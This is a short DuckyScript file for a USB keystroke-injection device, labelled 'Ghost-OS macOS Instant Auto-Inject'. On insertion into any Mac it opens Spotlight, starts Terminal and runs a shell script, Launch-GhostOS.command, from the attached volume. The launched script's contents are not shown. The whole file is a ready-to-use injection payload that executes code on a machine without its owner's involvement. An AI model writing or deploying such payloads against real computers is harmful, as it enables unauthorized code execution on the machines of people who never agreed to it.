REM ==================================================================
REM Ghost-OS macOS Instant Auto-Inject DuckyScript
REM Target: Any Intel or Apple Silicon (M1-M4) Mac
REM Triggers: Immediately upon USB physical insertion
REM ==================================================================

DELAY 600
GUI SPACE
DELAY 300
STRING terminal
ENTER
DELAY 500
STRING sh /Volumes/GhostVault/Launch-GhostOS.command
ENTER
